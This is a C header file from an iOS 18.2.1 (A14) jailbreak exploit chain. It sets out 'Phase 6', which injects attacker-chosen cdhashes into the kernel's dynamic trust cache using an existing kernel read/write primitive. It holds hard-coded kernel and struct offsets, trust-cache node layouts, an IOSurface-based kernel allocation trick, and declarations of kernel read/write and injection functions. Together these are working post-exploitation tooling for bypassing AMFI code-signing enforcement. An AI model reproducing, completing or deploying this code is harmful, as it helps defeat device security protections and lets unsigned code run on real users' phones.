// Phase 6 — trust cache injection for iOS 18.2.1 (22C161) A14
//
// Chain (all operations executed with the existing DarkSword kernel R/W;
// every kernel address involved is plain kernel code or heap memory —
// the loaded-trust-cache runtime object itself is heap-resident on A14,
// so no PPL bypass / kcall is required for the DIFFERENCE F inside the cache
// to live):
//
//   1. gKernelBase + PPL_TRUST_CACHE_RT_OFF   ->  global pointer slot (DATA_CONST)
//   2. *slot                                   ->  runtime object (heap)
//      object+0x0  next
//      object+0x8  prev
//      object+0x10 type (=5 DYNAMIC)
//      object+0x18 fileptr                      -- iOS 18.1+ node layout (size 0x28)
//      head ptr lives at  object+0x20  (Dopamine 16+ convention)
//   3. Node + file v1 blob injected via IOSurface kalloc (sizes up to 0x10000
//      = sizeof node + sizeof header + entries*22 < 60K for Sileo+uicache set)
//   4. AMFI live-reads **trusted kread64(rt+0x20) next-chain -> triggers on
//      sorted trustcache file with hash_type CS_HashType_SHA1.
//
// Static offsets (all cross-checked: 22C161 release kernelcache disassembly
// + Dopamine 3.x info.c iOS 18.x block). Slide-invariant below.

#include <stdint.h>
#include <stdbool.h>

extern uint64_t gOurProc, gOurTask, gKernelBase, gKernelSlide;

// kernel static base for iPhone13,2 18.x
#define KERN_STATIC_BASE            0xfffffff007004000ULL
// ppl_trust_cache_rt = 0xfffffff0079eb638 (XPF algorithm replicated offline:
// the PPL 0x6653 handler takes x0 = rt -> adrp+add pair at 0xfffffff00860f9f4).
// NOTE: 0xfffffff007a37000 (+0xA33000) is the ppl_runtime *dispatch-table*
// slot, NOT the tc rt — corrected 2026-08 against the PPLTEXT disasm.
// Head anchor (Dopamine 3.x trustcache.c convention):
//   kread64(rt + 0x20)  -> address of head-link field
//   kread64(anchor)     -> first loaded trust cache node
#define PPL_TRUST_CACHE_RT_OFF      0x09E7638ULL // 0xfffffff0079eb638
#define PPL_TC_HEAD_LINK_OFF        0x20
#define TC_NODE_NEXT                0x0
#define TC_NODE_PREV                0x8
#define TC_NODE_TYPE                0x10
#define TC_NODE_FILE                0x18
#define TC_NODE_SIZE                0x28
#define CS_HASH_TYPE_SHA1           1
#define TRUSTCACHE_TYPE_DYNAMIC     5

// ==========================================
//  18.x struct offsets (lara 18.0 block)
// ==========================================
#define OFF_TASK_ITK_SPACE          0x318
#define OFF_IPC_SPACE_TABLE         0x20
#define SMR_BASE                    2             // 16.3+ -> xpaci clears hi bits
#define OFF_IPC_ENTRY_IE_OBJECT     0x0
#define SIZEOF_IPC_ENTRY            0x18
#define OFF_IPC_PORT_KOBJECT        0x48

// IOSurface / IOMD fixed layout (Dopamine 18.x; IOSurface.ranges = 0x360 and
// rangeCount = 0x3a4 verified against 22C161 IOSurface::init disassembly:
//   str x0, [x19, #0x360]  /  str w(lsrs dataLen>>4), [x19, #0x3a4])
#define OFF_IOSURFACE_SENDRIGHT_SURFACE 0x18
#define OFF_IOMACHPORT_OBJECT       0x30     // iOS 17+ (Dopamine info.c 23.0+)
#define OFF_IOSURFACE_MEMORY_DESCRIPTOR 0x30
#define OFF_IOSURFACE_RANGES            0x360
#define OFF_IOSURFACE_RANGE_COUNT       0x3a4
#define OFF_IOMD_LENGTH             0x50
#define OFF_IOMD_FLAG               0x20
#define OFF_IOMD_MEMREF             0x28
#define OFF_IOMD_RANGES             0x60
#define OFF_IOMD_WIRED              0x88
#define OFF_IOMD_ZERO_0x70          0x70
#define OFF_IOMD_ZERO_0x18          0x18
#define OFF_IOMD_ZERO_0x90          0x90

// Runtime initialisation. Returns true if TC injection became possible
// (all required kernel globals resolved). Must be called after Phase-1 KRW.
bool phase6_init(void);

// Allocate a leaked kernel buffer of @size bytes via the IOSurface ranges
// trick (writes are un-lgd-freed by construction) -- returns kernel VA, 0 if failed.
uint64_t ps6_kalloc(uint64_t size);

// Free-form kernel R/W wrappers used by phase6 (provided by main.m / DarkSword)
extern void kwrite64(uint64_t addr, uint64_t val);
extern void kwrite32(uint64_t addr, uint32_t val);
extern void kwrite_buf(uint64_t addr, const void *buf, size_t size);
extern uint64_t kread64(uint64_t addr);
extern uint32_t kread32(uint64_t addr);
extern void kread_buf(uint64_t addr, void *buf, size_t size);
extern uint64_t kread_ptr(uint64_t addr);  // kread64 + xpaci
extern uint64_t xpaci(uint64_t v);

// Large kernel buffer copy helper used for dumping mappings. Provided
// locally; just a loop over 8-byte reads.
static inline void ps6_kreadbuf(uint64_t where, void *buf, size_t size) {
    kread_buf(where, buf, size);
}

// ==========================================
//  Trust cache injection
// ==========================================

// Builds a DYNAMIC v1 trust cache from @count cdhashes (20 bytes each),
// allocates kernel memory for the node + file, writes it, and inserts
// at the runtime head. Caller owns nothing (kernel owns it all forever).
bool phase6_inject_cdhashes(const uint8_t *hashes, uint32_t count);

// Inject an already-built v1 trust cache blob (Fugu15 tcload format:
// hdr(0x18) + 22-byte entries, pre-sorted). Used by load_trust_cache().
bool phase6_inject_tc_blob(const uint8_t *blob, uint32_t blob_size);

// Convenience wrapper: reads a proc's cs_blob on-chain through the
// vnode ubc_info cs_blobs[0].cdhash -> SHA256 truncated to 20B,
// collects everything, injects. File list is struct { const char *path; }.
bool phase6_inject_cdhashes_from_files(const char **paths, uint32_t npaths);

// Dump current loaded TC head + first entries (debug)
void phase6_dump_tc_head(void);

// CDHash extraction (in-kernel via CS blob walk)
bool ps6_extract_cdhash(const char *path, uint8_t (*out)[20]);

